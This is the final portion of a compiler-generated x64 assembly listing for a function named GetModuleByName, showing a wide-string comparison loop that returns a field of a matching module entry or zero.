	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	WORD PTR tv160[rsp], ax
$LN19@GetModuleB:
	movzx	eax, WORD PTR tv160[rsp]
	mov	WORD PTR c2$4[rsp], ax
; Line 56
	movzx	eax, WORD PTR c1$3[rsp]
	movzx	ecx, WORD PTR c2$4[rsp]
	cmp	eax, ecx
	je	SHORT $LN13@GetModuleB
	jmp	SHORT $LN6@GetModuleB
$LN13@GetModuleB:
; Line 57
	jmp	$LN5@GetModuleB
$LN6@GetModuleB:
; Line 59
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN14@GetModuleB
	mov	rax, QWORD PTR curr_name$2[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN14@GetModuleB
; Line 60
	mov	rax, QWORD PTR entry$5[rsp]
	mov	rax, QWORD PTR [rax+48]
	jmp	SHORT $LN1@GetModuleB
$LN14@GetModuleB:
; Line 62
	jmp	$LN2@GetModuleB
$LN3@GetModuleB:
; Line 64
	xor	eax, eax
$LN1@GetModuleB:
; Line 65
	add	rsp, 88					; 00000058H
	ret	0
?GetModuleByName@@YAPEAXPEA_W@Z ENDP			; GetModuleByName
_TEXT	ENDS
END
